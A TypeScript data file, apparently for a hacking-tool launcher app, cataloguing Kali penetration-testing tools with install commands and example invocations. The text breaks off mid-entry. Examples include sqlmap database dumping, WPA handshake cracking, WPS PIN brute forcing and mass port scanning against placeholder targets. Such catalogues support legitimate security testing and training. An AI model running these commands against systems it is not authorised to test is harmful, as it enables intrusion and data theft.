// AETHER.SHELL - Comprehensive Ethical Hacking Tools Database
// Real tools for real security work - Kali Linux, Termux, Nix, and custom

export interface ToolArg {
  name: string;
  flag: string;
  description: string;
  required: boolean;
  example: string;
  type: 'text' | 'number' | 'select';
  options?: string[];
}

export interface HackTool {
  id: string;
  name: string;
  category: ToolCategory;
  description: string;
  source: 'kali' | 'termux' | 'nix' | 'custom';
  dangerLevel: 'info' | 'low' | 'medium' | 'high' | 'critical';
  command: string;
  installCmd: string;
  args?: ToolArg[];
  offline: boolean;
  examples: string[];
  notes?: string;
  tags?: string[];
}

export type ToolCategory =
  | 'recon'
  | 'scanning'
  | 'web'
  | 'wireless'
  | 'password'
  | 'exploitation'
  | 'sniffing'
  | 'forensics'
  | 'reverse'
  | 'system'
  | 'network'
  | 'crypto'
  | 'scripts';

export interface CategoryInfo {
  id: ToolCategory;
  name: string;
  icon: string;
  description: string;
  color: string;
}

export const CATEGORIES: CategoryInfo[] = [
  { id: 'recon', name: 'Reconnaissance', icon: 'Search', description: 'OSINT, DNS, subdomain enumeration, target discovery', color: '#22d3ee' },
  { id: 'scanning', name: 'Scanning', icon: 'Radar', description: 'Port scanning, vulnerability assessment, service enumeration', color: '#f97316' },
  { id: 'web', name: 'Web Attacks', icon: 'Globe', description: 'SQL injection, XSS, directory busting, web vuln scanners', color: '#ef4444' },
  { id: 'wireless', name: 'Wireless', icon: 'Wifi', description: 'WiFi auditing, WPA cracking, Bluetooth, RF analysis', color: '#a855f7' },
  { id: 'password', name: 'Password', icon: 'Key', description: 'Hash cracking, brute force, wordlist generation, password analysis', color: '#eab308' },
  { id: 'exploitation', name: 'Exploitation', icon: 'Skull', description: 'Exploit frameworks, payload generation, post-exploitation', color: '#dc2626' },
  { id: 'sniffing', name: 'Sniffing', icon: 'Eye', description: 'Packet capture, MITM, protocol analysis, traffic inspection', color: '#06b6d4' },
  { id: 'forensics', name: 'Forensics', icon: 'Fingerprint', description: 'Disk forensics, memory analysis, file recovery, evidence collection', color: '#8b5cf6' },
  { id: 'reverse', name: 'Reverse Eng', icon: 'Layers', description: 'Binary analysis, disassembly, debugging, decompilation', color: '#ec4899' },
  { id: 'system', name: 'System', icon: 'Shield', description: 'System hardening, rootkit detection, firewall, privilege escalation', color: '#10b981' },
  { id: 'network', name: 'Network', icon: 'Network', description: 'Tunneling, proxies, VPN, DNS tools, network utilities', color: '#3b82f6' },
  { id: 'crypto', name: 'Cryptography', icon: 'Lock', description: 'Encryption, hashing, steganography, certificate analysis', color: '#f59e0b' },
  { id: 'scripts', name: 'Scripts', icon: 'Terminal', description: 'Custom Aether scripts for automation and specialized tasks', color: '#39FF14' },
];

export const TOOLS_DATABASE: HackTool[] = [
  // ═══════════════════════════════════════════
  // RECONNAISSANCE (16 tools)
  // ═══════════════════════════════════════════
  {
    id: 'nmap', name: 'Nmap', category: 'recon', source: 'kali',
    description: 'Network discovery and security auditing. The gold standard for port scanning.',
    dangerLevel: 'medium', command: 'nmap',
    installCmd: 'sudo apt install nmap',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target IP, range, or hostname', required: true, example: '192.168.1.0/24', type: 'text' },
      { name: 'scan_type', flag: '-s', description: 'Scan type', required: false, example: 'S', type: 'select', options: ['S (TCP SYN)', 'T (TCP Connect)', 'U (UDP)', 'A (Aggressive)', 'sV (Version)', 'O (OS Detect)', 'p- (All ports)'] },
      { name: 'ports', flag: '-p', description: 'Port(s) to scan', required: false, example: '80,443,8080', type: 'text' },
      { name: 'output', flag: '-oN', description: 'Output file', required: false, example: 'scan_results.txt', type: 'text' },
    ],
    examples: ['nmap -sV 192.168.1.1', 'nmap -sC -sV -A 192.168.1.0/24', 'nmap -p- -T4 10.0.0.1', 'nmap -sU --top-ports 100 192.168.1.1'],
    tags: ['port-scan', 'discovery', 'essential'],
  },
  {
    id: 'masscan', name: 'Masscan', category: 'recon', source: 'kali',
    description: 'Mass IP port scanner. Scans the entire internet in under 6 minutes.',
    dangerLevel: 'medium', command: 'masscan',
    installCmd: 'sudo apt install masscan',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target IP range', required: true, example: '10.0.0.0/8', type: 'text' },
      { name: 'ports', flag: '-p', description: 'Ports to scan', required: true, example: '80,443,22,8080', type: 'text' },
      { name: 'rate', flag: '--rate', description: 'Packets per second', required: false, example: '10000', type: 'number' },
    ],
    examples: ['masscan -p80,443 10.0.0.0/8 --rate=10000', 'masscan -p1-65535 192.168.1.0/24 --rate=5000'],
    tags: ['fast-scan', 'internet-scale'],
  },
  {
    id: 'dnsrecon', name: 'DNSRecon', category: 'recon', source: 'kali',
    description: 'DNS enumeration script. Performs zone transfers, brute force subdomains, and cache snooping.',
    dangerLevel: 'low', command: 'dnsrecon',
    installCmd: 'sudo apt install dnsrecon',
    offline: false,
    args: [
      { name: 'domain', flag: '-d', description: 'Target domain', required: true, example: 'example.com', type: 'text' },
      { name: 'type', flag: '-t', description: 'Enumeration type', required: false, example: 'brt', type: 'select', options: ['brt (Brute force)', 'std (Standard)', 'axfr (Zone Transfer)', 'srv (SRV Records)', 'bing (Bing search)', 'yandex (Yandex search)'] },
    ],
    examples: ['dnsrecon -d example.com -t std', 'dnsrecon -d example.com -t brt -D wordlist.txt'],
    tags: ['dns', 'enumeration'],
  },
  {
    id: 'whois', name: 'WHOIS', category: 'recon', source: 'kali',
    description: 'Domain registration and ownership lookup.',
    dangerLevel: 'info', command: 'whois',
    installCmd: 'sudo apt install whois',
    offline: false,
    args: [
      { name: 'domain', flag: '', description: 'Domain or IP to look up', required: true, example: 'example.com', type: 'text' },
    ],
    examples: ['whois example.com', 'whois 192.168.1.1'],
    tags: ['osint', 'essential'],
  },
  {
    id: 'amass', name: 'Amass', category: 'recon', source: 'kali',
    description: 'In-depth attack surface mapping and external asset discovery using OSINT.',
    dangerLevel: 'low', command: 'amass',
    installCmd: 'sudo apt install amass',
    offline: false,
    args: [
      { name: 'domain', flag: '-d', description: 'Target domain', required: true, example: 'example.com', type: 'text' },
      { name: 'mode', flag: '', description: 'Active or passive', required: false, example: 'enum -passive', type: 'select', options: ['enum (Active)', 'enum -passive (Passive)', 'intel (OSINT)', 'viz (Visualize)'] },
    ],
    examples: ['amass enum -d example.com', 'amass enum -passive -d example.com'],
    tags: ['subdomain', 'osint', 'discovery'],
  },
  {
    id: 'subfinder', name: 'Subfinder', category: 'recon', source: 'kali',
    description: 'Fast subdomain discovery tool using passive online sources.',
    dangerLevel: 'low', command: 'subfinder',
    installCmd: 'sudo apt install subfinder || go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest',
    offline: false,
    args: [
      { name: 'domain', flag: '-d', description: 'Target domain', required: true, example: 'example.com', type: 'text' },
    ],
    examples: ['subfinder -d example.com -o subs.txt'],
    tags: ['subdomain', 'passive'],
  },
  {
    id: 'theharvester', name: 'theHarvester', category: 'recon', source: 'kali',
    description: 'E-mail, subdomain, and people names harvester from public sources.',
    dangerLevel: 'medium', command: 'theharvester',
    installCmd: 'sudo apt install theharvester',
    offline: false,
    args: [
      { name: 'domain', flag: '-d', description: 'Target domain', required: true, example: 'example.com', type: 'text' },
      { name: 'source', flag: '-b', description: 'Data source', required: false, example: 'all', type: 'select', options: ['all', 'google', 'bing', 'linkedin', 'twitter', 'github', 'duckduckgo'] },
      { name: 'limit', flag: '-l', description: 'Result limit', required: false, example: '500', type: 'number' },
    ],
    examples: ['theharvester -d example.com -b all -l 500'],
    tags: ['osint', 'emails', 'harvesting'],
  },
  {
    id: 'sherlock', name: 'Sherlock', category: 'recon', source: 'kali',
    description: 'Hunt down social media accounts by username across hundreds of sites.',
    dangerLevel: 'low', command: 'sherlock',
    installCmd: 'pip3 install sherlock-project',
    offline: false,
    args: [
      { name: 'username', flag: '', description: 'Username to search', required: true, example: 'johndoe', type: 'text' },
    ],
    examples: ['sherlock johndoe', 'sherlock johndoe --print-found'],
    tags: ['osint', 'social-media', 'username'],
  },
  {
    id: 'whatweb', name: 'WhatWeb', category: 'recon', source: 'kali',
    description: 'Web scanner that identifies CMS, blogging platforms, analytics, and more.',
    dangerLevel: 'low', command: 'whatweb',
    installCmd: 'sudo apt install whatweb',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target URL or IP', required: true, example: 'http://example.com', type: 'text' },
    ],
    examples: ['whatweb http://example.com', 'whatweb -v http://example.com'],
    tags: ['web-fingerprint', 'cms-detect'],
  },
  {
    id: 'wafw00f', name: 'WAFW00F', category: 'recon', source: 'kali',
    description: 'Identifies and fingerprints Web Application Firewalls.',
    dangerLevel: 'low', command: 'wafw00f',
    installCmd: 'pip3 install wafw00f',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target URL', required: true, example: 'https://example.com', type: 'text' },
    ],
    examples: ['wafw00f https://example.com'],
    tags: ['waf', 'fingerprint'],
  },
  {
    id: 'recon-ng', name: 'Recon-ng', category: 'recon', source: 'kali',
    description: 'Full-featured web reconnaissance framework written in Python with modular interface.',
    dangerLevel: 'low', command: 'recon-ng',
    installCmd: 'sudo apt install recon-ng',
    offline: false,
    args: [
      { name: 'workspace', flag: '-w', description: 'Workspace name', required: false, example: 'target_recon', type: 'text' },
    ],
    examples: ['recon-ng', 'recon-ng -w target_recon'],
    notes: 'Interactive framework. Use "modules load" to load specific recon modules.',
    tags: ['framework', 'osint', 'modular'],
  },
  {
    id: 'dnsenum', name: 'DNSenum', category: 'recon', source: 'kali',
    description: 'Multithreaded perl script to enumerate DNS information of a domain.',
    dangerLevel: 'low', command: 'dnsenum',
    installCmd: 'sudo apt install dnsenum',
    offline: false,
    args: [
      { name: 'domain', flag: '', description: 'Target domain', required: true, example: 'example.com', type: 'text' },
    ],
    examples: ['dnsenum example.com', 'dnsenum -f wordlist.txt example.com'],
    tags: ['dns', 'bruteforce'],
  },
  {
    id: 'spiderfoot', name: 'SpiderFoot', category: 'recon', source: 'kali',
    description: 'Automated OSINT collection with 200+ data points. Full reconnaissance platform.',
    dangerLevel: 'medium', command: 'spiderfoot',
    installCmd: 'sudo apt install spiderfoot || pip3 install spiderfoot',
    offline: false,
    args: [
      { name: 'target', flag: '-s', description: 'Target IP, domain, or username', required: true, example: 'example.com', type: 'text' },
      { name: 'modules', flag: '-t', description: 'Modules to use (comma separated)', required: false, example: 'all', type: 'text' },
    ],
    examples: ['spiderfoot -s example.com -t all', 'spiderfoot -l  # Launch web UI on port 5001'],
    tags: ['osint', 'automation', 'framework'],
  },
  {
    id: 'maltego', name: 'Maltego CE', category: 'recon', source: 'kali',
    description: 'Visual link analysis and OSINT tool. Maps relationships between entities.',
    dangerLevel: 'medium', command: 'maltego',
    installCmd: 'sudo apt install maltego',
    offline: false,
    args: [
      { name: 'target', flag: '', description: 'Start GUI (no CLI args needed)', required: false, example: '', type: 'text' },
    ],
    examples: ['maltego  # Launches GUI'],
    notes: 'Primarily a GUI tool. Use for visual reconnaissance and relationship mapping.',
    tags: ['osint', 'visualization', 'gui'],
  },
  {
    id: 'enum4linux', name: 'Enum4Linux', category: 'recon', source: 'kali',
    description: 'Enumerate information from Windows/Samba systems. RID cycling, shares, users.',
    dangerLevel: 'medium', command: 'enum4linux',
    installCmd: 'sudo apt install enum4linux',
    offline: true,
    args: [
      { name: 'target', flag: '-a', description: 'Target IP or hostname', required: true, example: '192.168.1.100', type: 'text' },
    ],
    examples: ['enum4linux -a 192.168.1.100'],
    tags: ['smb', 'windows', 'enumeration'],
  },
  {
    id: 'lbd', name: 'LBD', category: 'recon', source: 'kali',
    description: 'Load balancer detector. Detects DNS, HTTP, and TCP load balanced hosts.',
    dangerLevel: 'info', command: 'lbd',
    installCmd: 'sudo apt install lbd || wget https://raw.githubusercontent.com/mschwartz/lbd/master/lbd.sh && chmod +x lbd.sh',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target host or IP', required: true, example: 'example.com', type: 'text' },
    ],
    examples: ['lbd example.com'],
    tags: ['load-balancer', 'detection'],
  },

  // ═══════════════════════════════════════════
  // SCANNING (13 tools)
  // ═══════════════════════════════════════════
  {
    id: 'nikto', name: 'Nikto', category: 'scanning', source: 'kali',
    description: 'Web server scanner that checks for dangerous files, outdated software, and misconfigurations.',
    dangerLevel: 'medium', command: 'nikto',
    installCmd: 'sudo apt install nikto',
    offline: true,
    args: [
      { name: 'target', flag: '-h', description: 'Target URL or IP', required: true, example: 'http://192.168.1.100', type: 'text' },
      { name: 'ports', flag: '-p', description: 'Port to scan', required: false, example: '8080', type: 'text' },
    ],
    examples: ['nikto -h http://192.168.1.100', 'nikto -h https://example.com -p 443'],
    tags: ['web-server', 'vulnerability', 'essential'],
  },
  {
    id: 'nuclei', name: 'Nuclei', category: 'scanning', source: 'kali',
    description: 'Fast vulnerability scanner based on YAML templates. 5000+ CVE templates.',
    dangerLevel: 'medium', command: 'nuclei',
    installCmd: 'go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest',
    offline: false,
    args: [
      { name: 'target', flag: '-u', description: 'Target URL', required: true, example: 'https://example.com', type: 'text' },
      { name: 'templates', flag: '-t', description: 'Template tags or paths', required: false, example: 'cves', type: 'select', options: ['cves', 'vulnerabilities', 'misconfiguration', 'exposures', 'default'] },
    ],
    examples: ['nuclei -u https://example.com', 'nuclei -u https://example.com -t cves -severity critical', 'nuclei -l urls.txt -t cves'],
    tags: ['vulnerability', 'templates', 'cve'],
  },
  {
    id: 'wpscan', name: 'WPScan', category: 'scanning', source: 'kali',
    description: 'WordPress vulnerability scanner. Enumerates plugins, themes, users, and known vulns.',
    dangerLevel: 'medium', command: 'wpscan',
    installCmd: 'sudo apt install wpscan || gem install wpscan',
    offline: true,
    args: [
      { name: 'url', flag: '--url', description: 'WordPress site URL', required: true, example: 'https://example.com', type: 'text' },
      { name: 'mode', flag: '', description: 'Scan mode', required: false, example: '', type: 'select', options: ['--enumerate u (Users)', '--enumerate ap (All Plugins)', '--enumerate at (All Themes)', '--passwords (Brute Force)'] },
    ],
    examples: ['wpscan --url https://example.com --enumerate u', 'wpscan --url https://example.com --enumerate ap --api-token TOKEN'],
    tags: ['wordpress', 'cms'],
  },
  {
    id: 'openvas', name: 'OpenVAS / GVM', category: 'scanning', source: 'kali',
    description: 'Full vulnerability management scanner. 70,000+ NVTs. Industry standard.',
    dangerLevel: 'high', command: 'gvm',
    installCmd: 'sudo apt install gvm',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Manage via web UI at https://localhost:9392', required: false, example: '', type: 'text' },
    ],
    examples: ['sudo gvm-start', 'sudo gvm-setup', 'gvm-check-setup'],
    notes: 'Setup is extensive. First run: sudo gvm-setup. Access web UI after setup.',
    tags: ['vulnerability-management', 'enterprise', 'comprehensive'],
  },
  {
    id: 'dirb', name: 'Dirb', category: 'scanning', source: 'kali',
    description: 'Web content scanner. Brute forces directories and files on web servers.',
    dangerLevel: 'low', command: 'dirb',
    installCmd: 'sudo apt install dirb',
    offline: true,
    args: [
      { name: 'url', flag: '', description: 'Target URL', required: true, example: 'http://example.com', type: 'text' },
      { name: 'wordlist', flag: '', description: 'Custom wordlist path', required: false, example: '/usr/share/dirb/wordlists/common.txt', type: 'text' },
    ],
    examples: ['dirb http://example.com', 'dirb http://example.com /usr/share/dirb/wordlists/big.txt -X .php,.html'],
    tags: ['directory-bruteforce', 'web'],
  },
  {
    id: 'gobuster', name: 'Gobuster', category: 'scanning', source: 'kali',
    description: 'Fast directory/file and DNS brute forcer written in Go.',
    dangerLevel: 'low', command: 'gobuster',
    installCmd: 'sudo apt install gobuster',
    offline: true,
    args: [
      { name: 'mode', flag: '', description: 'Scan mode', required: true, example: 'dir', type: 'select', options: ['dir (Directories)', 'dns (Subdomains)', 'vhost (Virtual Hosts)', 'fuzz (Fuzzing)', 'gcs (Google Cloud Storage)'] },
      { name: 'url', flag: '-u', description: 'Target URL', required: true, example: 'https://example.com', type: 'text' },
      { name: 'wordlist', flag: '-w', description: 'Wordlist path', required: false, example: '/usr/share/wordlists/dirb/common.txt', type: 'text' },
    ],
    examples: ['gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt', 'gobuster dns -d example.com -w subdomains.txt'],
    tags: ['bruteforce', 'fast', 'go'],
  },
  {
    id: 'ffuf', name: 'Ffuf', category: 'scanning', source: 'kali',
    description: 'Fast web fuzzer written in Go. Directory busting, parameter fuzzing, and more.',
    dangerLevel: 'low', command: 'ffuf',
    installCmd: 'sudo apt install ffuf || go install github.com/ffuf/ffuf/v2@latest',
    offline: true,
    args: [
      { name: 'url', flag: '-u', description: 'Target URL with FUZZ keyword', required: true, example: 'https://example.com/FUZZ', type: 'text' },
      { name: 'wordlist', flag: '-w', description: 'Wordlist', required: true, example: '/usr/share/wordlists/dirb/common.txt', type: 'text' },
    ],
    examples: ['ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt', 'ffuf -u https://example.com -w wordlist.txt -H "Host: FUZZ.example.com" -fc 404'],
    tags: ['fuzzing', 'fast', 'go'],
  },
  {
    id: 'feroxbuster', name: 'Feroxbuster', category: 'scanning', source: 'kali',
    description: 'Recursive content discovery tool written in Rust. Fast parallel brute forcing.',
    dangerLevel: 'low', command: 'feroxbuster',
    installCmd: 'sudo apt install feroxbuster',
    offline: true,
    args: [
      { name: 'url', flag: '-u', description: 'Target URL', required: true, example: 'https://example.com', type: 'text' },
      { name: 'wordlist', flag: '-w', description: 'Wordlist', required: false, example: '/usr/share/wordlists/dirb/common.txt', type: 'text' },
    ],
    examples: ['feroxbuster -u https://example.com -w /usr/share/wordlists/dirb/common.txt', 'feroxbuster -u https://example.com -w wordlist.txt -x php,html'],
    tags: ['bruteforce', 'recursive', 'rust'],
  },
  {
    id: 'joomscan', name: 'JoomScan', category: 'scanning', source: 'kali',
    description: 'Joomla vulnerability scanner. Detects version, components, and known issues.',
    dangerLevel: 'medium', command: 'joomscan',
    installCmd: 'sudo apt install joomscan || perl joomscan.pl',
    offline: true,
    args: [
      { name: 'url', flag: '-u', description: 'Joomla site URL', required: true, example: 'https://example.com', type: 'text' },
    ],
    examples: ['joomscan -u https://example.com'],
    tags: ['joomla', 'cms'],
  },
  {
    id: 'skipfish', name: 'Skipfish', category: 'scanning', source: 'kali',
    description: 'Active web application security reconnaissance tool by Google.',
    dangerLevel: 'medium', command: 'skipfish',
    installCmd: 'sudo apt install skipfish',
    offline: true,
    args: [
      { name: 'output', flag: '-o', description: 'Output directory', required: true, example: '/tmp/skipfish_results', type: 'text' },
      { name: 'url', flag: '', description: 'Target URL', required: true, example: 'https://example.com', type: 'text' },
    ],
    examples: ['skipfish -o /tmp/results https://example.com'],
    tags: ['web-crawler', 'recon', 'google'],
  },
  {
    id: 'testssl', name: 'testssl.sh', category: 'scanning', source: 'kali',
    description: 'Testing TLS/SSL encryption on any host. Checks ciphers, protocols, and vulnerabilities.',
    dangerLevel: 'low', command: 'testssl.sh',
    installCmd: 'sudo apt install testssl.sh || wget https://github.com/drwetter/testssl.sh/archive/refs/heads/master.zip',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target host:port or URL', required: true, example: 'example.com:443', type: 'text' },
    ],
    examples: ['testssl.sh example.com:443', 'testssl.sh --html --logfile output.html example.com'],
    tags: ['ssl', 'tls', 'encryption'],
  },
  {
    id: 'rustscan', name: 'RustScan', category: 'scanning', source: 'kali',
    description: 'Port scanner that automatically pipes results into Nmap. Extremely fast.',
    dangerLevel: 'medium', command: 'rustscan',
    installCmd: 'sudo apt install rustscan',
    offline: true,
    args: [
      { name: 'target', flag: '-a', description: 'Target IP/range', required: true, example: '192.168.1.0/24', type: 'text' },
      { name: 'ports', flag: '-p', description: 'Port range', required: false, example: '1-65535', type: 'text' },
    ],
    examples: ['rustscan -a 192.168.1.1', 'rustscan -a 192.168.1.0/24 -p 1-65535 -- -sV'],
    tags: ['fast-scan', 'rust', 'nmap-pipe'],
  },
  {
    id: 'httpx', name: 'HTTPX', category: 'scanning', source: 'kali',
    description: 'Fast and multi-purpose HTTP toolkit. Probe URLs, extract titles, status codes, tech.',
    dangerLevel: 'low', command: 'httpx',
    installCmd: 'go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest',
    offline: true,
    args: [
      { name: 'list', flag: '-l', description: 'Input file with URLs', required: false, example: 'urls.txt', type: 'text' },
      { name: 'url', flag: '-u', description: 'Single URL to probe', required: false, example: 'https://example.com', type: 'text' },
    ],
    examples: ['httpx -l urls.txt -title -status-code -tech-detect', 'httpx -u https://example.com -sc -cl -ct'],
    tags: ['http-probe', 'fast', 'go'],
  },

  // ═══════════════════════════════════════════
  // WEB ATTACKS (12 tools)
  // ═══════════════════════════════════════════
  {
    id: 'sqlmap', name: 'SQLMap', category: 'web', source: 'kali',
    description: 'Automatic SQL injection and database takeover tool. Supports all major DBMS.',
    dangerLevel: 'high', command: 'sqlmap',
    installCmd: 'sudo apt install sqlmap',
    offline: true,
    args: [
      { name: 'url', flag: '-u', description: 'Target URL with injectable parameter', required: true, example: 'http://example.com/page?id=1', type: 'text' },
      { name: 'data', flag: '--data', description: 'POST data string', required: false, example: 'username=admin&password=test', type: 'text' },
      { name: 'level', flag: '--level', description: 'Detection level (1-5)', required: false, example: '5', type: 'number' },
      { name: 'risk', flag: '--risk', description: 'Risk level (1-3)', required: false, example: '3', type: 'number' },
      { name: 'dbs', flag: '', description: 'Enumerate databases', required: false, example: '--dbs', type: 'select', options: ['--dbs', '--tables', '--current-db', '--current-user', '--passwords', '--dump'] },
    ],
    examples: ['sqlmap -u "http://example.com/page?id=1" --dbs', 'sqlmap -u "http://example.com" --data="user=admin&pass=test" --dbs --batch', 'sqlmap -u "http://example.com/page?id=1" --dump -D dbname -T tablename'],
    tags: ['sqli', 'injection', 'essential'],
  },
  {
    id: 'xsser', name: 'XSSer', category: 'web', source: 'kali',
    description: 'Automated XSS (Cross-Site Scripting) vulnerability scanner and exploiter.',
    dangerLevel: 'high', command: 'xsser',
    installCmd: 'sudo apt install xsser',
    offline: true,
    args: [
      { name: 'url', flag: '--url', description: 'Target URL', required: true, example: 'http://example.com/page?q=test', type: 'text' },
    ],
    examples: ['xsser --url "http://example.com/search?q=test" --auto'],
    tags: ['xss', 'cross-site-scripting'],
  },
  {
    id: 'dalfox', name: 'DalFox', category: 'web', source: 'kali',
    description: 'Fast XSS scanner with intelligent parameter analysis and payload generation.',
    dangerLevel: 'high', command: 'dalfox',
    installCmd: 'go install github.com/hahwul/dalfox/v2@latest || sudo apt install dalfox',
    offline: true,
    args: [
      { name: 'url', flag: 'url', description: 'Target URL', required: true, example: 'https://example.com/search?q=test', type: 'text' },
    ],
    examples: ['dalfox url https://example.com/search?q=test', 'dalfox file urls.txt'],
    tags: ['xss', 'fast', 'go'],
  },
  {
    id: 'owaspzap', name: 'OWASP ZAP', category: 'web', source: 'kali',
    description: 'Integrated penetration testing tool for web applications. Full-featured scanner.',
    dangerLevel: 'high', command: 'zap-cli',
    installCmd: 'sudo apt install zaproxy',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Target URL (use zap-cli)', required: true, example: 'https://example.com', type: 'text' },
    ],
    examples: ['zap-cli quick-scan https://example.com', 'zap-cli active-scan https://example.com', 'zap-cli spider https://example.com'],
    notes: 'zap-cli is the command-line interface. Full GUI: zap',
    tags: ['web-scanner', 'owasp', 'comprehensive'],
  },
  {
    id: 'arjun', name: 'Arjun', category: 'web', source: 'kali',
    description: 'HTTP parameter discovery suite. Finds hidden GET/POST parameters.',
    dangerLevel: 'low', command: 'arjun',
    installCmd: 'pip3 install arjun',
    offline: true,
    args: [
      { name: 'url', flag: '-u', description: 'Target URL', required: true, example: 'https://example.com/api', type: 'text' },
    ],
    examples: ['arjun -u https://example.com/api', 'arjun -u https://example.com/api -m POST'],
    tags: ['parameter-discovery', 'hidden-params'],
  },
  {
    id: 'waybackurls', name: 'WaybackUrls', category: 'web', source: 'kali',
    description: 'Fetch known URLs from the Wayback Machine for a domain.',
    dangerLevel: 'info', command: 'waybackurls',
    installCmd: 'go install github.com/tomnomnom/waybackurls@latest',
    offline: false,
    args: [
      { name: 'domain', flag: '', description: 'Target domain', required: true, example: 'example.com', type: 'text' },
    ],
    examples: ['echo "example.com" | waybackurls > urls.txt', 'waybackurls example.com'],
    tags: ['osint', 'urls', 'archive'],
  },
  {
    id: 'hakrawler', name: 'Hakrawler', category: 'web', source: 'kali',
    description: 'Simple Go web crawler for discovering endpoints and assets.',
    dangerLevel: 'low', command: 'hakrawler',
    installCmd: 'go install github.com/hakluke/hakrawler@latest',
    offline: true,
    args: [
      { name: 'url', flag: '-u', description: 'Target URL', required: true, example: 'https://example.com', type: 'text' },
      { name: 'depth', flag: '-d', description: 'Crawl depth', required: false, example: '5', type: 'number' },
    ],
    examples: ['echo "https://example.com" | hakrawler', 'hakrawler -u https://example.com -d 3 -subs'],
    tags: ['crawler', 'go', 'endpoint-discovery'],
  },
  {
    id: 'kxss', name: 'kxss', category: 'web', source: 'kali',
    description: 'Extract potential XSS parameters from responses and reflectable values.',
    dangerLevel: 'medium', command: 'kxss',
    installCmd: 'go install github.com/Emoe/kxss@latest',
    offline: true,
    args: [
      { name: 'input', flag: '', description: 'Pipe URLs or response bodies', required: true, example: 'cat urls.txt', type: 'text' },
    ],
    examples: ['cat urls.txt | kxss'],
    tags: ['xss', 'parameter-extraction'],
  },
  {
    id: 'paramspider', name: 'ParamSpider', category: 'web', source: 'kali',
    description: 'Crawl endpoints and find potentially vulnerable parameters.',
    dangerLevel: 'low', command: 'paramspider',
    installCmd: 'pip3 install paramspider || git clone https://github.com/devanshbatham/ParamSpider',
    offline: false,
    args: [
      { name: 'domain', flag: '-d', description: 'Target domain', required: true, example: 'example.com', type: 'text' },
    ],
    examples: ['paramspider -d example.com'],
    tags: ['parameter-discovery', 'crawler'],
  },
  {
    id: 'burpsuite', name: 'Burp Suite CE', category: 'web', source: 'kali',
    description: 'Industry-leading web application security testing platform by PortSwigger.',
    dangerLevel: 'high', command: 'burpsuite',
    installCmd: 'sudo apt install burpsuite',
    offline: true,
    args: [
      { name: 'target', flag: '', description: 'Launch GUI, configure target in Proxy tab', required: false, example: '', type: 'text' },
    ],
    examples: ['burpsuite  # Launches GUI', 'java -jar burpsuite.jar --headless'],
    notes: 'GUI tool. Use Community Edition for free. Configure browser proxy to 127.0.0.1:8080.',
    tags: ['proxy', 'intercept', 'web-testing'],
  },
  {
    id: 'subjs', name: 'Subjs', category: 'web', source: 'kali',
    description: 'Fetches javascript files from a website. Useful for finding endpoints and secrets.',
    dangerLevel: 'info', command: 'subjs',
    installCmd: 'go install github.com/lc/subjs@latest',
    offline: true,
    args: [
      { name: 'url', flag: '-u', description: 'Target URL', required: true, example: 'https://example.com', type: 'text' },
    ],
    examples: ['subjs -u https://example.com'],
    tags: ['javascript', 'endpoint-discovery'],
  },
  {
    id: 'secretfinder', name: 'SecretFinder', category: 'web', source: 'custom',
    description: 'Find secrets/keys/API tokens in JavaScript files.',
    dangerLevel: 'medium', command: 'secretfinder',
    installCmd: 'pip3 install secretfinder || git clone https://github.com/m4ll0k/SecretFinder',
    offline: true,
    args: [
      { name: 'url', flag: '-i', description: 'URL or file path to JS', required: true, example: 'https://example.com/app.js', type: 'text' },
    ],
    examples: ['python3 SecretFinder.py -i https://example.com/app.js -o output.html'],
    tags: ['secrets', 'api-keys', 'javascript'],
  },

  // ═══════════════════════════════════════════
  // WIRELESS (10 tools)
  // ═══════════════════════════════════════════
  {
    id: 'aircrack-ng', name: 'Aircrack-ng', category: 'wireless', source: 'kali',
    description: 'Complete suite of WiFi security assessment tools. Capture, crack, and analyze WEP/WPA.',
    dangerLevel: 'high', command: 'aircrack-ng',
    installCmd: 'sudo apt install aircrack-ng',
    offline: true,
    args: [
      { name: 'capture', flag: '', description: 'Capture file (.cap)', required: true, example: 'wpa_capture-01.cap', type: 'text' },
      { name: 'wordlist', flag: '-w', description: 'Wordlist for cracking', required: false, example: '/usr/share/wordlists/rockyou.txt', type: 'text' },
    ],
    examples: ['aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap', 'airmon-ng start wlan0', 'airodump-ng wlan0mon'],
    notes: 'Requires monitor mode and compatible wireless adapter. Full suite: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng.',
    tags: ['wifi', 'wpa', 'wep', 'essential'],
  },
  {
    id: 'wifite', name: 'Wifite', category: 'wireless', source: 'kali',
    description: 'Automated wireless auditing script. Auto-targets WEP, WPA, and WPS networks.',
    dangerLevel: 'high', command: 'wifite',
    installCmd: 'sudo apt install wifite',
    offline: true,
    args: [
      { name: 'interface', flag: '-i', description: 'Wireless interface', required: false, example: 'wlan0', type: 'text' },
    ],
    examples: ['sudo wifite', 'sudo wifite -i wlan0 --wpa --dict /usr/share/wordlists/rockyou.txt'],
    notes: 'Automated tool. Requires wireless adapter in monitor mode.',
    tags: ['wifi', 'automated', 'wpa'],
  },
  {
    id: 'reaver', name: 'Reaver', category: 'wireless', source: 'kali',
    description: 'WPS brute force attack tool. Exploits WPS PIN vulnerability.',
    dangerLevel: 'high', command: 'reaver',
    installCmd: 'sudo apt install reaver',
    offline: true,
    args: [
      { name: 'interface', flag: '-i', description: 'Wireless interface', required: true, example: 'wlan0mon', type: 'text' },
      { name: 'bssid', flag: '-b', description: 'Target BSSID', required: true, example: 'AA:BB:CC:DD:EE:FF', type: 'text' },
    ],
    examples: ['sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF', 'sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv'],
    tags: ['wps', 'wifi', 'brute-force'],
  },
  {
    id: 'pixiewps', name: 'PixieWPS', category: 'wireless', source: 'kali',
    description: 'Offline WPS attack tool exploiting the Pixie Dust vulnerability.',
